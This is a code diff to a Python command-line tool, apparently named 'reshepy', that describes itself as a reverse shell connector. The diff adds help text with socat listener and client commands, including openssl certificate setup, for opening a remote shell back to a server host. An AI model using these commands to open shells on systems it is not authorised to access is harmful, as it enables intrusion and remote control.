@@ -13,8 +13,27 @@ import argparse
 
 
 def main():
+    description = '''
+This script is reverse shell connector
+'''
+    epilog = '''
+----####---- command example ----####----
+
+# secure connection
+## server
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 3650 -nodes -subj "/C=US/ST=/L=/O=/OU=/CN=$SERVER_HOST/emailAddress=/"
+socat $(tty),raw,echo=0 openssl-listen:$SERVER_PORT,reuseaddr,cert=cert.pem,key=key.pem,verify=0
+## client
+reshepy --cert cert.pem --host=$SERVER_HOST $SERVER_ADDR:$SERVER_PORT
+
+# insecure connection
+## server
+socat $(tty),raw,echo=0 tcp-listen:$SERVER_PORT,reuseaddr
+## client
+reshepy --disable-ssl $SERVER_ADDR:$SERVER_PORT
+'''
     parser = argparse.ArgumentParser(
-        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+        formatter_class=argparse.RawDescriptionHelpFormatter, description=description, epilog=epilog)
     parser.add_argument('-c', '--cert', default='',
                         help='cert.pem (for oreore server certifications)')
     # NOTE: this default value is used for avoiding
